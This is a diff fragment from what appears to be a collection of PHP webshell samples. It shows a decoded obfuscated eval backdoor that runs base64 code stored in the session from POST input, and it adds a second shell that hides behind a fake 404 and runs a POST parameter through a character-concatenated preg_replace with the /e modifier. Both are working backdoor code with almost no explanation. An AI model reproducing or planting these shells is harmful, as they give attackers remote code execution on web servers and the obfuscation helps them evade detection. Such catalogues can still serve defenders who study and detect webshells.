@@ -16,3 +16,9 @@ $title = 'e'.""./*80*/'v'."#1253#"./**/'a'.""./*1433*/'l'.""./**/'(b'.""./*3306*
 # 解码后
 eval(@session_start();if(isset($_POST['code']))substr(sha1(md5($_POST['a'])),36)=='222f'&&$_SESSION['theCode']=$_POST['code'];if(isset($_SESSION['theCode']))@eval(base64_decode($_SESSION['theCode'])););
 ```
+
+- 2
+```php
+<?php if(!$_POST['handlepass']){header('HTTP/1.1 404 Not Found'); exit();}else{$s="p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"; $s("~[discuz]~e",$_POST['handlepass'],"Access"); } ?>
+
+```
